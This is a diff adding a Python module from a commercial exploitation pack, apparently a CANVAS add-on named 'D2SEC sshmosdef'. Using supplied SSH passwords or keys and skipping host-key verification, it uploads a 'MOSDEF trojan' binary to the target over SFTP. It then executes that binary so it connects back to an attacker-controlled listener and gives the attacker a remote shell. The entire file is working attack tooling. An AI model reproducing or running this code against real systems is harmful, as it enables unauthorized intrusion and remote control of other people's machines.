@@ -1,0 +1,203 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import sys, os
+
+sys.path.append(".")
+sys.path.append("libs")
+sys.path.append("3rdparty/D2SEC/libs")
+
+from canvasexploit import canvasexploit
+from canvasengine import *
+from MOSDEFShellServer import MSSgeneric
+
+import interactive
+import libs.paramiko as paramiko
+
+NAME = "D2SEC sshmosdef"
+DESCRIPTION = "Run a mosdef trojan via a ssh session"
+DOCUMENTATION = {}
+DOCUMENTATION["Notes"] = """
+You need only select a connect back target, d2sec_sshmosdef does all the work.
+"""
+
+VERSION="0.1"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Tool"
+PROPERTY['ARCH'] = [ ["Linux", "i386"], ["Solaris", "All"], ["FreeBSD", "i386"], ["AIX 5.2", "PPC"] ]
+
+TARGETS = {
+	0 : ["Linux i386", "v_linux_i386"],
+	1 : ["Solaris i386", "v_solaris_i386"],
+	2 : ["Solaris SPARC", "v_solaris_sparc"],
+	3 : ["FreeBSD i386", "v_freebsd_i386"],
+	4 : ["AIX 5.2 PPC", "v_aix52_ppc"],
+}
+
+class sshpolicy:
+	def missing_host_key(self, client, hostname, key):
+		return
+
+class theexploit(canvasexploit):
+	def __init__(self):
+		canvasexploit.__init__(self)
+		self.name = NAME
+		self.host = ""
+		self.port = 22
+		self.cbackport = 5555
+		self.user = ""
+		self.passwd = ""
+		self.version = 0
+		self.dest = ""
+		self.rsakey = ""
+		self.dsakey = ""
+
+	def getargs(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port", self.port))
+		self.version = int(self.argsDict.get("version",self.version))
+		self.cbackport = int(self.argsDict.get("cback_port", self.cbackport))
+		self.user = self.argsDict.get("user", self.user)
+		self.passwd = self.argsDict.get("passwd", self.passwd)
+		self.rsakey = self.argsDict.get("rsakey", self.rsakey)
+		self.dsakey = self.argsDict.get("dsakey", self.dsakey)
+		self.dest = self.argsDict.get("dest", self.dest)
+
+	def make_auth(self, t):
+		if not self.user:
+			self.log("You must specify an user !")
+			return 1
+
+		if self.user and self.passwd:	
+			t.auth_password(username=self.user, password=self.passwd)
+			if not t.is_authenticated():
+				self.log("Authentication failed !")
+				t.close()
+				return 1
+		elif self.rsakey:
+			try:
+				key = paramiko.RSAKey.from_private_key_file(self.rsakey)
+			except paramiko.PasswordRequiredException:
+				self.log("Password required !")
+				return
+			t.auth_publickey(self.user, key)
+		elif self.dsakey:
+			try:
+				key = paramiko.DSSKey.from_private_key_file(self.dsakey)
+			except paramiko.PasswordRequiredException:
+				self.log("Password required !")
+				return
+			t.auth_publickey(self.user, key)
+		else:
+			self.log("Error with authentication parameters (user, passwd, rsa key or dsa key)")
+			return 1
+
+		return 0
+
+	def run(self):
+		self.getargs()
+
+		self.setInfo("%s (in progress)"%(NAME))
+
+		interface = self.engine.get_callback_interface()
+		
+		if self.version == 0:
+			self.callback = self.engine.start_listener(interface, LINUXMOSDEF, self.cbackport)
+		if self.version == 1:
+			self.callback = self.engine.start_listener(interface, SOLARISMOSDEF_INTEL, self.cbackport)
+		if self.version == 2:
+			self.callback = self.engine.start_listener(interface, SOLARISSPARCMOSDEF, self.cbackport)
+		if self.version == 3:
+			self.callback = self.engine.start_listener(interface, FREEBSDMOSDEF, self.cbackport)		
+		if self.version == 4:
+			self.callback = self.engine.start_listener(interface, AIXMOSDEF_52_PPC, self.cbackport)		
+
+		if self.callback == 0:
+			return 0
+
+		if not self.dest:
+			self.log("Desination file not specified")
+			self.setInfo("%s (failed)"%(NAME))
+			return 0
+
+		bin = TARGETS[self.version][1]
+
+		try:
+			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			sock.connect((self.host, self.port))
+		except Exception, e:
+			self.log("Connect failed: %s" % str(e))
+			return 0
+
+		t = paramiko.Transport(sock)
+
+		try:
+			t.start_client()
+		except paramiko.SSHException:
+			self.log("SSH negotiation failed")
+			return 0
+
+		try:
+			i = self.make_auth(t)
+			if i == 1:
+				return 0
+
+			#t.connect(username=self.user, password=self.passwd)
+			sftp = paramiko.SFTPClient.from_transport(t)
+			sftp.put("3rdparty/D2SEC/exploits/d2sec_sshmosdef/%s" % bin, self.dest)
+			sftp.close()
+		except:
+			self.log ("Can't upload cback binary")
+			self.setInfo("%s (failed)"%(NAME))
+			return 0
+
+		try:
+			t.close()
+		except:
+			pass
+
+		try:
+			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			sock.connect((self.host, self.port))
+		except Exception, e:
+			self.log("Connect failed: %s" % str(e))
+			return 0
+
+		t = paramiko.Transport(sock)
+		try:
+			t.start_client()
+		except paramiko.SSHException:
+			self.log("SSH negotiation failed")
+			return 0
+
+		try:
+			self.make_auth(t)
+
+			chan = t.open_session()
+			chan.exec_command("chmod 755 %s; %s %s %d" % (self.dest, self.dest, interface, self.cbackport))
+			chan.close()
+		except:
+			pass
+
+		try:
+			t.close()
+		except:
+			pass
+
+		self.setInfo("%s (finished)"%(NAME))
+		return 1
+
+if __name__ == "__main__":
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
+    if ret not in [0,1,None]:
+        ret.interact()
+
